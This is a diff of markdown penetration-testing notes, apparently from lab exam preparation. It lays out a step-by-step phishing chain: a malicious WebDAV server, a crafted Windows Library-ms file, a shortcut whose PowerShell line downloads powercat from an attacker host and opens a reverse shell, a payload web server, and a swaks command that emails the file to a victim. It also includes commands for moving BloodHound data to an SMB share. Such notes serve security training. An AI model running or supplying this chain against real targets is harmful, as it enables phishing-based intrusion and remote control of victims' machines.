@@ -17,6 +17,11 @@
    impacket-smbserver -smb2support -username kali -password kali share .
    \\ip-address-of-your-linux-machine\SHARE
    ```
+- Advance tech transfer files 
+   ```
+    net use y: \\192.168.45.243\SHARE /user:kali kali
+    Move-Item -Path 20240623021511_BloodHound.zip -Destination \\192.168.45.243\SHARE\20240623021511_BloodHound.zip
+    ```
 
 - Macro example: 
 ``` 
@@ -46,39 +51,46 @@ End Sub
 - useful post-exploit file transfer: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/ 
 
 ## Execution vis Windows Library Files
-- Send email to victim containing 'config,.Library-ms' which direct to malicious wsgidev 
-``` 
-/home/hoidam/.local/bin/wsgidav --host=0.0.0.0 --port 80 --auth=anonymous --root /home/hoidam/webdav/
-```
-- Edit IP variable
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-<name>@windows.storage.dll,-34582</name>
-<version>6</version>
-<isLibraryPinned>true</isLibraryPinned>
-<iconReference>imageres.dll,-1003</iconReference>
-<templateInfo>
-<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-</templateInfo>
-<searchConnectorDescriptionList>
-<searchConnectorDescription>
-<isDefaultSaveLocation>true</isDefaultSaveLocation>
-<isSupported>false</isSupported>
-<simpleLocation>
-<url>http://192.168.119.2</url>
-</simpleLocation>
-</searchConnectorDescription>
-</searchConnectorDescriptionList>
-</libraryDescription>
-```
-- edit the .ink file (shortcut) to run reverse shell
-``` 
-owershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
-powercat -c 192.168.119.3 -p 4444 -e powershell"
-```
+- create a folder for this
+1. Send email to victim containing 'config.Library-ms' which direct to malicious wsgidev 
+    ``` 
+    wsgidav --host=0.0.0.0 --port 80 --auth=anonymous --root /home/kali/webdav/
+    ```
+
+2. Edit IP variable to our kali and save as 'config.Library-ms' (extension = all files) then double click the file and copy paste itself into the folder
+    ```
+        <?xml version="1.0" encoding="UTF-8"?>
+        <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+        <name>@windows.storage.dll,-34582</name>
+        <version>6</version>
+        <isLibraryPinned>true</isLibraryPinned>
+        <iconReference>imageres.dll,-1003</iconReference>
+        <templateInfo>
+        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+        </templateInfo>
+        <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+        <isDefaultSaveLocation>true</isDefaultSaveLocation>
+        <isSupported>false</isSupported>
+        <simpleLocation>
+        <url>http://192.168.119.2</url>
+        </simpleLocation>
+        </searchConnectorDescription>
+        </searchConnectorDescriptionList>
+        </libraryDescription>
+    ```
+3. edit the .ink file (shortcut) to run reverse shell & change the file name to install
+    ``` 
+        powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+        powercat -c 192.168.119.3 -p 4444 -e powershell"
+    ```
+4. Prepare web server hosting powercat file
+   ``` 
+    cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+    python3 -m http.server 8000
+    ```
 
 ## SMTP tool
 Send email with given information e.g. receiver/sender, smtp server usrname pw
 - SWAKS
-  ``` sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.151.199 --body body.txt --header "Subject: Problems" --suppress-data ```
+  ``` sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.151.199 --body body.txt --header "Subject: Problems" --suppress-data ```
